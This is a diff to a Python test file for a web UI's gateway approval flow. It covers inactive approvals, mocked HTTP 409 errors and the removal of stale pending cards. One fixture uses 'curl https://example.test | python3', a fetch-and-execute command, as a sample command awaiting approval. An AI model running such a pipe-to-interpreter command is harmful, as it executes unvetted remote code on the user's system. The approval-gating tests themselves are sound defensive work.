@@ -4,6 +4,8 @@ from __future__ import annotations
 
 import pathlib
 import sys
+import urllib.error
+from io import BytesIO
 
 
 ROOT = pathlib.Path(__file__).resolve().parents[1]
@@ -50,6 +52,30 @@ def test_gateway_run_approval_payload_falls_back_to_stream_run_id():
     assert payload["_gateway_run_id"] == "run_from_stream"
 
 
+def test_gateway_run_approval_result_marks_not_pending_as_inactive(monkeypatch):
+    from api.gateway_chat import resolve_gateway_run_approval_result
+
+    def fake_urlopen(_req, timeout=30):
+        raise urllib.error.HTTPError(
+            url="http://127.0.0.1:8642/v1/runs/run_done/approval",
+            code=409,
+            msg="Conflict",
+            hdrs={},
+            fp=BytesIO(b'{"error":{"code":"approval_not_pending"}}'),
+        )
+
+    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
+
+    result = resolve_gateway_run_approval_result(
+        {"_gateway_run_id": "run_done", "_session_id": "webui-session-1"},
+        "once",
+    )
+
+    assert result["resolved"] is False
+    assert result["inactive"] is True
+    assert result["code"] == "approval_not_pending"
+
+
 def test_webui_approval_response_resolves_gateway_run(monkeypatch):
     from api import routes
 
@@ -71,9 +97,9 @@ def test_webui_approval_response_resolves_gateway_run(monkeypatch):
 
     def fake_resolve(pending, choice):
         calls.append((dict(pending), choice))
-        return True
+        return {"resolved": True, "inactive": False}
 
-    monkeypatch.setattr("api.gateway_chat.resolve_gateway_run_approval", fake_resolve)
+    monkeypatch.setattr("api.gateway_chat.resolve_gateway_run_approval_result", fake_resolve)
 
     assert routes._resolve_approval_legacy(sid, approval_id, "once") is True
     assert calls == [
@@ -109,13 +135,47 @@ def test_gateway_resolve_failure_restores_pending_card(monkeypatch):
         },
     )
 
-    monkeypatch.setattr("api.gateway_chat.resolve_gateway_run_approval", lambda _pending, _choice: False)
+    monkeypatch.setattr(
+        "api.gateway_chat.resolve_gateway_run_approval_result",
+        lambda _pending, _choice: {"resolved": False, "inactive": False},
+    )
 
     assert routes._resolve_approval_legacy(sid, approval_id, "once") is False
     with routes._lock:
         queue = routes._pending.get(sid)
         assert isinstance(queue, list)
         assert queue[0]["approval_id"] == approval_id
+
+
+def test_gateway_inactive_approval_failure_drops_stale_pending_card(monkeypatch):
+    from api import routes
+
+    sid = "webui-session-bridge-inactive"
+    approval_id = "approval-bridge-inactive"
+    routes.submit_pending(
+        sid,
+        {
+            "approval_id": approval_id,
+            "_gateway_run_id": "run_bridge_inactive",
+            "command": "curl https://example.test | python3",
+            "description": "script execution via pipe",
+            "pattern_key": "script execution via pipe",
+            "pattern_keys": ["script execution via pipe"],
+        },
+    )
+
+    monkeypatch.setattr(
+        "api.gateway_chat.resolve_gateway_run_approval_result",
+        lambda _pending, _choice: {
+            "resolved": False,
+            "inactive": True,
+            "code": "approval_not_pending",
+        },
+    )
+
+    assert routes._resolve_approval_legacy(sid, approval_id, "once") is False
+    with routes._lock:
+        assert routes._pending.get(sid) is None
 
 
 def test_gateway_run_clear_only_removes_matching_run():
